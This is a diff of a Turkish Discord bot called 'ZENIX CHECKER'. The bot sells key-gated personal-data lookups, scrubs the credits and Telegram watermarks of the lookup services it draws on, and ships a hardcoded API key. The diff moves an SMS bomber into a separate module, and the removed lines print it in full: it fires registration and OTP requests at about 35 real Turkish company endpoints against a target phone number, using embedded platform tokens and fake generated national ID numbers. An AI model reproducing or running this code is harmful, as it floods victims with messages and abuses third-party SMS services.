@@ -11,14 +11,14 @@ import re
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from typing import Optional
 from urllib.parse import urlencode
-from random import choice, randint
-from string import ascii_lowercase
 
 import aiohttp
-import requests
 import discord
 from discord import app_commands
 from discord.ext import commands
+
+# SMS Bomber'ı ayrı dosyadan import et
+from smsapi import SmsBomber, SERVICE_NAMES
 
 # ==================== HEALTH CHECK ====================
 def run_health_server():
@@ -30,15 +30,13 @@ def run_health_server():
             self.end_headers()
             self.wfile.write(b"ZENIX CHECKER - AKTIF")
         def do_HEAD(self):
-            self.send_response(200)
-            self.end_headers()
+            self.send_response(200); self.end_headers()
         def log_message(self, *args): pass
     server = HTTPServer(("0.0.0.0", port), Handler)
     print(f"🌐 Health check {port} portunda")
     server.serve_forever()
 
 threading.Thread(target=run_health_server, daemon=True).start()
-
 
 # ==================== ENV ====================
 try:
@@ -49,7 +47,6 @@ except ImportError: pass
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN", "")
 SEARCH_KEY    = os.getenv("SEARCH_API_KEY", "91e2c5dfa0de4a22e2afbe5b")
 
-# ==================== SABİT ID ====================
 ADMIN_ID = 1538810452308533308
 MAIN_GUILD_ID = 1546912458793287725
 
@@ -59,14 +56,9 @@ SOLIDARK     = "https://solidarksystems.alwaysdata.net"
 SEARCHULP    = "https://searchulp.xyz/api"
 ID_API       = "https://prox0959.netlify.app/api/search"
 
-LOGO_URL = os.getenv(
-    "LOGO_URL",
-    "https://media.discordapp.net/attachments/1547608436726824990/1557810396914651217/image.png?ex=6ac9277d&is=6ac7d5fd&hm=cd53b64f969a5b8c89b88f7375dd6cd5ae7d120b8f711ca778f349215a24da54&=&format=webp&quality=lossless"
-)
+LOGO_URL = os.getenv("LOGO_URL", "https://media.discordapp.net/attachments/1547608436726824990/1557810396914651217/image.png?ex=6ac9277d&is=6ac7d5fd&hm=cd53b64f969a5b8c89b88f7375dd6cd5ae7d120b8f711ca778f349215a24da54&=&format=webp&quality=lossless")
 
-COLOR_OK   = 0x10b981
-COLOR_ERR  = 0xe11d48
-COLOR_Z    = 0x8b5cf6
+COLOR_OK, COLOR_ERR, COLOR_Z = 0x10b981, 0xe11d48, 0x8b5cf6
 
 # ==================== JSON DB ====================
 DB_FILE = "zenix_data.json"
@@ -77,8 +69,7 @@ def load_db():
     try:
         with open(DB_FILE, "r", encoding="utf-8") as f:
             data = json.load(f)
-        data.setdefault("keys", {})
-        data.setdefault("user_keys", {})
+        data.setdefault("keys", {}); data.setdefault("user_keys", {})
         data.setdefault("guilds", [MAIN_GUILD_ID])
         if MAIN_GUILD_ID not in data["guilds"]:
             data["guilds"].append(MAIN_GUILD_ID)
@@ -90,522 +81,121 @@ def save_db():
     try:
         with open(DB_FILE, "w", encoding="utf-8") as f:
             json.dump(DB, f, ensure_ascii=False, indent=2)
-    except Exception as e:
-        print(f"❌ DB save: {e}")
+    except Exception as e: print(f"❌ DB: {e}")
 
 DB = load_db()
 
 def generate_key():
-    part = lambda: secrets.token_hex(2).upper()
-    return f"ZENIX-{part()}-{part()}-{part()}"
+    p = lambda: secrets.token_hex(2).upper()
+    return f"ZENIX-{p()}-{p()}-{p()}"
 
-def user_has_key(user_id: int) -> bool:
-    return str(user_id) in DB["user_keys"]
-
-def get_user_key(user_id: int):
-    return DB["user_keys"].get(str(user_id))
-
-def register_key(user_id: int, key: str):
-    DB["keys"][key] = {"user_id": user_id, "created_at": datetime.datetime.utcnow().isoformat()}
-    DB["user_keys"][str(user_id)] = key
+def user_has_key(uid): return str(uid) in DB["user_keys"]
+def get_user_key(uid): return DB["user_keys"].get(str(uid))
+def register_key(uid, key):
+    DB["keys"][key] = {"user_id": uid, "created_at": datetime.datetime.utcnow().isoformat()}
+    DB["user_keys"][str(uid)] = key
     save_db()
+def is_allowed_guild(gid): return gid is not None and gid in DB["guilds"]
+def is_admin(uid): return uid == ADMIN_ID
 
-def is_allowed_guild(guild_id):
-    return guild_id is not None and guild_id in DB["guilds"]
+# ==================== FİLTRE ====================
+HARD_BLOCK = ["arastirguncel", "iptal edilmiştir", "iptal edilmistir", "lutfen telegram", "lütfen telegram", "kanalimiza tekrar", "anahtariniz iptal", "anahtarınız iptal", "jessy_php", "@jessy", "jessy", "@wazelybaba", "wazelybaba", "wazely", "@ato.asd", "ato.asd", "atoasd", "@coder", "coder_"]
+SOFT_CLEAN = ["@arastirguncel", "arastirguncel", "t.me/arastirguncel", "telegram kanalimiza", "telegram kanalımıza", "@jessy_php", "jessy_php", "@jessy", "@wazelybaba", "wazelybaba", "@ato.asd", "ato.asd"]
+STRIP_KEYS = {"dev", "auth", "author", "developer", "credit", "credits", "owner", "made_by", "madeby", "creator", "source", "powered_by", "poweredby", "signature", "sign", "vendor", "provider_tag", "tg", "telegram", "contact", "sig", "watermark", "coder", "ig", "instagram", "message", "msg", "note", "not", "info_text", "info_message", "bio", "bio_text", "author_info", "signature_text", "sign_text", "extra", "extras", "meta", "meta_info", "developer_info"}
+REGEX_PATTERNS = [re.compile(r'ig\s*:\s*@?\w+', re.IGNORECASE), re.compile(r'instagram\s*:\s*@?\w+', re.IGNORECASE), re.compile(r'tg\s*:\s*@?\w+', re.IGNORECASE), re.compile(r'telegram\s*:\s*@?\w+', re.IGNORECASE), re.compile(r'auth\s*:\s*@?\w+', re.IGNORECASE), re.compile(r'coder\s*:\s*@?\w+', re.IGNORECASE), re.compile(r'dev\s*:\s*@?\w+', re.IGNORECASE), re.compile(r'credits?\s*:\s*@?\w+', re.IGNORECASE), re.compile(r'by\s+@\w+', re.IGNORECASE), re.compile(r'@[a-zA-Z0-9_.]+')]
 
-def is_admin(user_id: int) -> bool:
-    return user_id == ADMIN_ID
+def contains_hard_block(t):
+    if not isinstance(t, str): return False
+    low = t.lower()
+    return any(p in low for p in HARD_BLOCK)
 
+def scrub_text(t):
+    if not isinstance(t, str): return t
+    r = t
+    for w in SOFT_CLEAN:
+        r = r.replace(w, "").replace(w.title(), "").replace(w.upper(), "")
+    for p in REGEX_PATTERNS:
+        r = p.sub("", r)
+    r = re.sub(r'\s{2,}', ' ', r).strip()
+    return r.strip("|:-\t ")
 
-# ==================== 🔥 GÜÇLÜ FİLTRE ====================
-# Tamamen yok edilecek kelimeler (içerikte geçerse tüm alan silinir)
-HARD_BLOCK = [
-    "arastirguncel",
-    "iptal edilmiştir",
-    "iptal edilmistir",
-    "lutfen telegram",
-    "lütfen telegram",
-    "kanalimiza tekrar",
-    "anahtariniz iptal",
-    "anahtarınız iptal",
-    "jessy_php", "@jessy", "jessy",
-    "@wazelybaba", "wazelybaba", "wazely",
-    "@ato.asd", "ato.asd", "atoasd",
-    "@coder", "coder_",
-]
-
-# İçerikten silinecek kelimeler (metin içinde geçerse o kısım temizlenir)
-SOFT_CLEAN = [
-    "@arastirguncel", "arastirguncel", "t.me/arastirguncel",
-    "telegram kanalimiza", "telegram kanalımıza",
-    "@jessy_php", "jessy_php", "@jessy",
-    "@wazelybaba", "wazelybaba",
-    "@ato.asd", "ato.asd",
-]
-
-# Tamamen silinecek anahtarlar (JSON field'lar)
-STRIP_KEYS = {
-    "dev", "auth", "author", "developer", "credit", "credits",
-    "owner", "made_by", "madeby", "creator", "source", "powered_by",
-    "poweredby", "signature", "sign", "vendor", "provider_tag",
-    "tg", "telegram", "contact", "sig", "watermark",
-    "coder", "ig", "instagram", "message", "msg", "note",
-    "not", "info_text", "info_message", "bio", "bio_text",
-    "author_info", "signature_text", "sign_text", "extra",
-    "extras", "meta", "meta_info", "developer_info",
-}
-
-# Regex kalıpları (metin içinde geçen @kullanıcı, ig: @xxx vs.)
-REGEX_PATTERNS = [
-    re.compile(r'ig\s*:\s*@?\w+', re.IGNORECASE),           # "ig: @ato.asd" veya "ig:xxx"
-    re.compile(r'instagram\s*:\s*@?\w+', re.IGNORECASE),
-    re.compile(r'tg\s*:\s*@?\w+', re.IGNORECASE),
-    re.compile(r'telegram\s*:\s*@?\w+', re.IGNORECASE),
-    re.compile(r'auth\s*:\s*@?\w+', re.IGNORECASE),
-    re.compile(r'coder\s*:\s*@?\w+', re.IGNORECASE),
-    re.compile(r'dev\s*:\s*@?\w+', re.IGNORECASE),
-    re.compile(r'credits?\s*:\s*@?\w+', re.IGNORECASE),
-    re.compile(r'by\s+@\w+', re.IGNORECASE),
-    re.compile(r'@[a-zA-Z0-9_.]+'),                          # tek başına "@username"
-]
-
-
-def contains_hard_block(text: str) -> bool:
-    if not isinstance(text, str): return False
-    low = text.lower()
-    return any(pat in low for pat in HARD_BLOCK)
-
-
-def scrub_text(text: str) -> str:
-    if not isinstance(text, str): return text
-    result = text
-    for word in SOFT_CLEAN:
-        result = result.replace(word, "")
-        result = result.replace(word.title(), "")
-        result = result.replace(word.upper(), "")
-    for pattern in REGEX_PATTERNS:
-        result = pattern.sub("", result)
-    # Fazla boşlukları temizle
-    result = re.sub(r'\s{2,}', ' ', result).strip()
-    # Baştaki/sondaki | ve : işaretlerini temizle
-    result = result.strip("|:-\t ")
-    return result
-
-
-def clean_data(data, depth: int = 0):
+def clean_data(data, depth=0):
     if depth > 10: return data
-
     if isinstance(data, str):
         if contains_hard_block(data): return None
         return scrub_text(data)
-
     if isinstance(data, dict):
         err = data.get("error")
-        if err and isinstance(err, str) and contains_hard_block(err):
-            return None
-        cleaned = {}
+        if err and isinstance(err, str) and contains_hard_block(err): return None
+        c = {}
         for k, v in data.items():
-            if k.lower() in STRIP_KEYS:
-                continue
-            cleaned_v = clean_data(v, depth + 1)
-            if cleaned_v is not None:
-                cleaned[k] = cleaned_v
-        return cleaned if cleaned else None
-
+            if k.lower() in STRIP_KEYS: continue
+            cv = clean_data(v, depth+1)
+            if cv is not None: c[k] = cv
+        return c if c else None
     if isinstance(data, list):
-        cleaned = [clean_data(x, depth + 1) for x in data]
-        cleaned = [x for x in cleaned if x is not None]
-        return cleaned if cleaned else None
-
+        c = [clean_data(x, depth+1) for x in data]
+        c = [x for x in c if x is not None]
+        return c if c else None
     return data
 
-
 def chunk_text(text, size=1900):
-    return [text[i:i + size] for i in range(0, len(text), size)]
-
+    return [text[i:i+size] for i in range(0, len(text), size)]
 
 async def send_result(interaction, data):
     cleaned = clean_data(data)
     if cleaned is None:
-        embed = discord.Embed(color=COLOR_ERR, description="```\nSonuç bulunamadı.\n```")
-        embed.set_thumbnail(url=LOGO_URL)
-        await interaction.followup.send(embed=embed)
-        return
-
-    if isinstance(cleaned, (dict, list)):
-        pretty = json.dumps(cleaned, indent=2, ensure_ascii=False)
-    else:
-        pretty = str(cleaned)
-
+        e = discord.Embed(color=COLOR_ERR, description="```\nSonuç bulunamadı.\n```")
+        e.set_thumbnail(url=LOGO_URL)
+        await interaction.followup.send(embed=e); return
+    pretty = json.dumps(cleaned, indent=2, ensure_ascii=False) if isinstance(cleaned, (dict, list)) else str(cleaned)
     if pretty.strip() in ("{}", "[]", "null", ""):
-        embed = discord.Embed(color=COLOR_ERR, description="```\nSonuç bulunamadı.\n```")
-        embed.set_thumbnail(url=LOGO_URL)
-        await interaction.followup.send(embed=embed)
-        return
-
+        e = discord.Embed(color=COLOR_ERR, description="```\nSonuç bulunamadı.\n```")
+        e.set_thumbnail(url=LOGO_URL)
+        await interaction.followup.send(embed=e); return
     if len(pretty) > 3800:
-        file = discord.File(io.BytesIO(pretty.encode("utf-8")), filename="zenix.json")
-        embed = discord.Embed(color=COLOR_OK, description=f"```json\n{pretty[:3800]}\n```")
-        embed.set_thumbnail(url=LOGO_URL)
-        await interaction.followup.send(embed=embed, file=file)
-        return
-
-    for i, chunk in enumerate(chunk_text(f"```json\n{pretty}\n```")):
+        f = discord.File(io.BytesIO(pretty.encode("utf-8")), filename="zenix.json")
+        e = discord.Embed(color=COLOR_OK, description=f"```json\n{pretty[:3800]}\n```")
+        e.set_thumbnail(url=LOGO_URL)
+        await interaction.followup.send(embed=e, file=f); return
+    for i, c in enumerate(chunk_text(f"```json\n{pretty}\n```")):
         if i == 0:
-            embed = discord.Embed(color=COLOR_OK, description=chunk)
-            embed.set_thumbnail(url=LOGO_URL)
-            await interaction.followup.send(embed=embed)
-        else:
-            await interaction.followup.send(chunk)
+            e = discord.Embed(color=COLOR_OK, description=c)
+            e.set_thumbnail(url=LOGO_URL)
+            await interaction.followup.send(embed=e)
+        else: await interaction.followup.send(c)
 
+def build_welcome_embed():
+    e = discord.Embed(title="✨  HOŞ GELDİNİZ  ✨",
+        description="**ZENIX CHECKER**\n\n🔎 Gelişmiş sorgulama sistemleri\n⚡ Hızlı ve güvenilir sonuçlar\n🎯 Tek komutla her şeye erişim\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔑 **Anahtar:** `/anahtargir`\n📖 **Komutlar:** `/yardim`",
+        color=COLOR_Z, timestamp=datetime.datetime.utcnow())
+    e.set_thumbnail(url=LOGO_URL); e.set_image(url=LOGO_URL)
+    return e
 
-def build_welcome_embed() -> discord.Embed:
-    embed = discord.Embed(
-        title="✨  HOŞ GELDİNİZ  ✨",
-        description=(
-            "**ZENIX CHECKER**\n\n"
-            "🔎  Gelişmiş sorgulama sistemleri\n"
-            "⚡  Hızlı ve güvenilir sonuçlar\n"
-            "🎯  Tek komutla her şeye erişim\n\n"
-            "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-            "🔑  **Anahtar almak için:** `/anahtargir`\n"
-            "📖  **Komutlar için:** `/yardim`"
-        ),
-        color=COLOR_Z, timestamp=datetime.datetime.utcnow()
-    )
-    embed.set_thumbnail(url=LOGO_URL)
-    embed.set_image(url=LOGO_URL)
-    return embed
+async def fetch_json(url, timeout=25):
+    try:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
+                txt = await r.text()
+                try: return json.loads(txt)
+                except: return {"error": "invalid_response", "raw": txt[:200]}
+    except asyncio.TimeoutError: return {"error": "timeout"}
+    except Exception: return {"error": "connection_failed"}
 
-
-async def precheck(interaction) -> bool:
+async def precheck(interaction):
     if interaction.guild is None:
-        await interaction.response.send_message("❌ **DM'den komut kullanamazsın.**", ephemeral=True)
-        return False
+        await interaction.response.send_message("❌ **DM'den kullanamazsın.**", ephemeral=True); return False
     if not is_allowed_guild(interaction.guild.id):
-        await interaction.response.send_message("❌ **Bu sunucuda kullanım izni yok.**", ephemeral=True)
-        return False
+        await interaction.response.send_message("❌ **Bu sunucuda izin yok.**", ephemeral=True); return False
     if not is_admin(interaction.user.id) and not user_has_key(interaction.user.id):
-        await interaction.response.send_message(
-            "🔑 **Anahtar gerekli!**\nKomutları kullanmak için önce `/anahtargir` ile anahtarını gir.",
-            ephemeral=True
-        )
-        return False
+        await interaction.response.send_message("🔑 **Anahtar gerekli!** `/anahtargir`", ephemeral=True); return False
     return True
 
-
-# ==================== SMS BOMBER ====================
-class SmsBomber:
-    def __init__(self, phone: str, mail: str = ""):
-        self.phone = str(phone).lstrip("0")
-        if self.phone.startswith("+90"): self.phone = self.phone[3:]
-        if self.phone.startswith("90") and len(self.phone) == 12: self.phone = self.phone[2:]
-        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"
-        self.tc = self._gen_tc()
-        self.results = []
-
-    def _gen_tc(self):
-        rakam = [randint(1, 9)] + [randint(0, 9) for _ in range(8)]
-        rakam.append(((sum(rakam[0:9:2]) * 7) - sum(rakam[1:8:2])) % 10)
-        rakam.append(sum(rakam[:10]) % 10)
-        return "".join(str(r) for r in rakam)
-
-    def _add(self, name, ok): self.results.append((name, ok))
-
-    # --- SERVİSLER ---
-    def kahvedunyasi(self):
-        try:
-            r = requests.post("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
-                headers={"Content-Type": "application/json", "X-Language-Id": "tr-TR", "X-Client-Platform": "web", "Origin": "https://www.kahvedunyasi.com", "Referer": "https://www.kahvedunyasi.com/", "User-Agent": "Mozilla/5.0"},
-                json={"countryCode": "90", "phoneNumber": self.phone}, timeout=6)
-            self._add("kahvedunyasi.com", r.json().get("processStatus") == "Success")
-        except: self._add("kahvedunyasi.com", False)
-
-    def wmf(self):
-        try:
-            r = requests.post("https://www.wmf.com.tr/users/register/",
-                data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail, "email_allowed": "true", "first_name": "Memati", "gender": "male", "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
-            self._add("wmf.com.tr", r.status_code == 202)
-        except: self._add("wmf.com.tr", False)
-
-    def bim(self):
-        try:
-            r = requests.post("https://bim.veesk.net/service/v1.0/account/login", json={"phone": self.phone}, timeout=6)
-            self._add("bim.veesk.net", r.status_code == 200)
-        except: self._add("bim.veesk.net", False)
-
-    def englishhome(self):
-        try:
-            r = requests.post("https://www.englishhome.com/api/member/sendOtp",
-                headers={"Content-Type": "application/json", "Origin": "https://www.englishhome.com", "Referer": "https://www.englishhome.com/", "User-Agent": "Mozilla/5.0"},
-                json={"Phone": self.phone, "XID": ""}, timeout=6)
-            self._add("englishhome.com", r.json().get("isError") == False)
-        except: self._add("englishhome.com", False)
-
-    def suiste(self):
-        try:
-            r = requests.post("https://suiste.com/api/auth/code",
-                headers={"Content-Type": "application/x-www-form-urlencoded; charset=utf-8", "X-Mobillium-Device-Brand": "Apple", "X-Mobillium-Os-Type": "iOS", "Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "X-Mobillium-Device-Id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "User-Agent": "suiste/1.7.11"},
-                data={"action": "register", "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330", "full_name": "Memati Bas", "gsm": self.phone, "is_advertisement": "1", "is_contract": "1", "password": "31MeMaTi31"}, timeout=6)
-            self._add("suiste.com", r.json().get("code") == "common.success")
-        except: self._add("suiste.com", False)
-
-    def kimgb(self):
-        try:
-            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", json={"msisdn": f"90{self.phone}"}, timeout=6)
-            self._add("kimgb", r.status_code == 200)
-        except: self._add("kimgb", False)
-
-    def evidea(self):
-        try:
-            r = requests.post("https://www.evidea.com/users/register/",
-                headers={"Content-Type": "multipart/form-data; boundary=xx", "X-App-Device": "ios", "User-Agent": "Evidea/1"},
-                data=f"--xx\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--xx--\r\n", timeout=6)
-            self._add("evidea.com", r.status_code == 202)
-        except: self._add("evidea.com", False)
-
-    def ucdortbes(self):
-        try:
-            r = requests.post("https://api.345dijital.com/api/users/register",
-                headers={"Content-Type": "application/json", "User-Agent": "AriPlusMobile/21"},
-                json={"email": "", "name": "Memati", "phoneNumber": f"+90{self.phone}", "surname": "Bas"}, timeout=6)
-            self._add("345dijital.com", r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!")
-        except: self._add("345dijital.com", False)
-
-    def tiklagelsin(self):
-        try:
-            r = requests.post("https://svc.apps.tiklagelsin.com/user/graphql",
-                headers={"Content-Type": "application/json", "X-No-Auth": "true", "Appversion": "2.4.1"},
-                json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}, timeout=6)
-            self._add("tiklagelsin.com", r.json().get("data", {}).get("generateOtp") == True)
-        except: self._add("tiklagelsin.com", False)
-
-    def naosstars(self):
-        try:
-            r = requests.post("https://api.naosstars.com/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350",
-                headers={"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030", "Locale": "en-TR", "Content-Type": "application/json"},
-                json={"telephone": f"+90{self.phone}", "type": "register"}, timeout=6)
-            self._add("naosstars.com", r.status_code == 200)
-        except: self._add("naosstars.com", False)
-
-    def koton(self):
-        try:
-            r = requests.post("https://www.koton.com/users/register/",
-                headers={"Content-Type": "multipart/form-data; boundary=yy", "X-App-Type": "akinon-mobile", "User-Agent": "Koton/1"},
-                data=f"--yy\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--yy--\r\n", timeout=6)
-            self._add("koton.com", r.status_code == 202)
-        except: self._add("koton.com", False)
-
-    def hayatsu(self):
-        try:
-            r = requests.post("https://api.hayatsu.com.tr/api/SignUp/SendOtp",
-                headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.hayatsu.com.tr", "User-Agent": "Mozilla/5.0"},
-                data={"mobilePhoneNumber": self.phone, "actionType": "register"}, timeout=6)
-            self._add("hayatsu.com.tr", r.json().get("is_success") == True)
-        except: self._add("hayatsu.com.tr", False)
-
-    def hizliecza(self):
-        try:
-            r = requests.post("https://prod.hizliecza.net/mobil/account/sendOTP",
-                headers={"Content-Type": "application/json", "User-Agent": "hizliecza/31"},
-                json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}, timeout=6)
-            self._add("hizliecza.net", r.status_code == 200)
-        except: self._add("hizliecza.net", False)
-
-    def metro(self):
-        try:
-            r = requests.post("https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
-                headers={"Content-Type": "application/json; charset=utf-8", "Applicationversion": "2.4.1"},
-                json={"methodType": "2", "mobilePhoneNumber": self.phone}, timeout=6)
-            self._add("metro-tr.com", r.json().get("status") == "success")
-        except: self._add("metro-tr.com", False)
-
-    def filemarket(self):
-        try:
-            r = requests.post("https://api.filemarket.com.tr/v1/otp/send",
-                headers={"Content-Type": "application/json", "X-Os": "IOS", "X-Version": "1.7"},
-                json={"mobilePhoneNumber": f"90{self.phone}"}, timeout=6)
-            self._add("filemarket.com.tr", r.json().get("responseType") == "SUCCESS")
-        except: self._add("filemarket.com.tr", False)
-
-    def akasya(self):
-        try:
-            r = requests.post("https://akasyaapi.poilabs.com/v1/en/sms",
-                headers={"Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5"},
-                json={"phone": self.phone}, timeout=6)
-            self._add("akasya.com.tr", r.json().get("result") == "SMS sended succesfully!")
-        except: self._add("akasya.com.tr", False)
-
-    def akbati(self):
-        try:
-            r = requests.post("https://akbatiapi.poilabs.com/v1/en/sms",
-                headers={"Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3"},
-                json={"phone": self.phone}, timeout=6)
-            self._add("akbati.com", r.json().get("result") == "SMS sended succesfully!")
-        except: self._add("akbati.com", False)
-
-    def komagene(self):
-        try:
-            r = requests.post("https://gateway.komagene.com.tr/auth/auth/smskodugonder",
-                headers={"Content-Type": "application/json", "Firmaid": "32", "Referer": "https://www.komagene.com.tr/"},
-                json={"FirmaId": 32, "Telefon": self.phone}, timeout=6)
-            self._add("komagene.com.tr", r.json().get("Success") == True)
-        except: self._add("komagene.com.tr", False)
-
-    def porty(self):
-        try:
-            r = requests.post("https://panel.porty.tech/api.php?",
-                headers={"Content-Type": "application/json", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"},
-                json={"job": "start_login", "phone": self.phone}, timeout=6)
-            self._add("porty.tech", r.json().get("status") == "success")
-        except: self._add("porty.tech", False)
-
-    def tasdelen(self):
-        try:
-            r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp",
-                headers={"Content-Type": "application/json"},
-                json={"phone": self.phone}, timeout=6)
-            self._add("tasdelen", r.json().get("result") == True)
-        except: self._add("tasdelen", False)
-
-    def uysal(self):
-        try:
-            r = requests.post("https://api.uysalmarket.com.tr/api/mobile-users/send-register-sms",
-                headers={"Content-Type": "application/json;charset=utf-8", "Origin": "https://www.uysalmarket.com.tr"},
-                json={"phone_number": self.phone}, timeout=6)
-            self._add("uysalmarket.com.tr", r.status_code == 200)
-        except: self._add("uysalmarket.com.tr", False)
-
-    def yapp(self):
-        try:
-            r = requests.post("https://yapp.com.tr/api/mobile/v1/register",
-                headers={"Content-Type": "application/json"},
-                json={"phone_number": self.phone, "email": self.mail, "firstname": "M", "lastname": "B", "app_version": "1.1.5", "device_type": "I", "sms_code": ""}, timeout=6)
-            self._add("yapp.com.tr", r.status_code == 200)
-        except: self._add("yapp.com.tr", False)
-
-    def beefull(self):
-        try:
-            requests.post("https://app.beefull.io/api/inavitas-access-management/signup",
-                json={"email": self.mail, "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail, "firstName": "M", "lastName": "B", "language": "tr", "password": "123456"}, timeout=4)
-            r = requests.post("https://app.beefull.io/api/inavitas-access-management/sms-login",
-                json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}, timeout=4)
-            self._add("beefull.io", r.status_code == 200)
-        except: self._add("beefull.io", False)
-
-    def dominos(self):
-        try:
-            r = requests.post("https://frontend.dominos.com.tr/api/customer/sendOtpCode",
-                headers={"Content-Type": "application/json;charset=utf-8", "Appversion": "IOS-7.1.0"},
-                json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}, timeout=6)
-            self._add("dominos.com.tr", r.json().get("isSuccess") == True)
-        except: self._add("dominos.com.tr", False)
-
-    def frink(self):
-        try:
-            r = requests.post("https://api.frink.com.tr/api/auth/postSendOTP",
-                headers={"Content-Type": "application/json"},
-                json={"areaCode": "90", "etkContract": True, "language": "TR", "phoneNumber": "90" + self.phone}, timeout=6)
-            self._add("frink.com.tr", r.json().get("processStatus") == "SUCCESS")
-        except: self._add("frink.com.tr", False)
-
-    def bodrum(self):
-        try:
-            r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
-                headers={"Content-Type": "application/json", "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Origin": "capacitor://localhost"},
-                json={"gsm": "+90" + self.phone, "source": "orwi"}, timeout=6)
-            self._add("bodrum.bel.tr", r.status_code == 200)
-        except: self._add("bodrum.bel.tr", False)
-
-    def kofteciyusuf(self):
-        try:
-            r = requests.post("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder",
-                headers={"Content-Type": "application/json; charset=utf-8", "Firmaid": "82", "Ostype": "iOS"},
-                json={"FirmaId": 82, "Telefon": self.phone, "FireBaseCihazKey": None, "GuvenlikKodu": None}, timeout=6)
-            self._add("kofteciyusuf.com", r.json().get("Success") == True)
-        except: self._add("kofteciyusuf.com", False)
-
-    def orwi(self):
-        try:
-            r = requests.post("https://gandalf.orwi.app/api/user/requestOtp",
-                headers={"Content-Type": "application/json", "Apikey": "YWxpLTEyMzQ1MTEyNDU2NTQzMg", "Origin": "capacitor://localhost"},
-                json={"gsm": f"+90{self.phone}", "source": "orwi"}, timeout=6)
-            self._add("orwi.app", r.status_code == 200)
-        except: self._add("orwi.app", False)
-
-    def coffy(self):
-        try:
-            r = requests.post("https://user-api-gw.coffy.com.tr/user/signup",
-                headers={"Content-Type": "application/json", "Language": "tr"},
-                json={"countryCode": "90", "gsm": self.phone, "isKVKKAgreementApproved": True, "isUserAgreementApproved": True, "name": "Memati Bas"}, timeout=6)
-            self._add("coffy.com.tr", r.status_code == 200)
-        except: self._add("coffy.com.tr", False)
-
-    def hamidiye(self):
-        try:
-            r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp",
-                headers={"Content-Type": "application/json", "Origin": "com.hamidiyeapp"},
-                json={"isGuest": False, "phone": self.phone}, timeout=6)
-            self._add("hamidiye.istanbul", r.json().get("result") == True)
-        except: self._add("hamidiye.istanbul", False)
-
-    def money(self):
-        try:
-            r = requests.post("https://www.money.com.tr/Account/ValidateAndSendOTP",
-                headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://www.money.com.tr", "Referer": "https://www.money.com.tr/"},
-                data={"phone": f"{self.phone[:3]} {self.phone[3:10]}", "GRecaptchaResponse": ""}, timeout=6)
-            self._add("money.com.tr", r.json().get("resultType") == 0)
-        except: self._add("money.com.tr", False)
-
-    def alixavien(self):
-        try:
-            r = requests.post("https://www.alixavien.com.tr/api/member/sendOtp",
-                headers={"Content-Type": "application/json", "Origin": "https://www.alixavien.com.tr"},
-                json={"Phone": self.phone, "XID": ""}, timeout=6)
-            self._add("alixavien.com.tr", r.json().get("isError") == False)
-        except: self._add("alixavien.com.tr", False)
-
-    def jimmykey(self):
-        try:
-            r = requests.post(f"https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
-            self._add("jimmykey.com", r.json().get("Sonuc") == True)
-        except: self._add("jimmykey.com", False)
-
-    def ido(self):
-        try:
-            r = requests.post("https://api.ido.com.tr/idows/v2/register",
-                headers={"Content-Type": "application/json", "Origin": "https://www.ido.com.tr"},
-                json={"birthDate": True, "captcha": "", "checkPwd": "313131", "code": "", "day": 24, "email": self.mail, "emailNewsletter": False, "firstName": "MEMATI", "gender": "MALE", "lastName": "BAS", "mobileNumber": f"0{self.phone}", "month": 9, "pwd": "313131", "smsNewsletter": True, "tckn": self.tc, "termsOfUse": True, "year": 1977}, timeout=6)
-            self._add("ido.com.tr", r.status_code == 200)
-        except: self._add("ido.com.tr", False)
-
-    def get_services(self):
-        return [
-            self.kahvedunyasi, self.wmf, self.bim, self.englishhome, self.suiste,
-            self.kimgb, self.evidea, self.ucdortbes, self.tiklagelsin, self.naosstars,
-            self.koton, self.hayatsu, self.hizliecza, self.metro, self.filemarket,
-            self.akasya, self.akbati, self.komagene, self.porty, self.tasdelen,
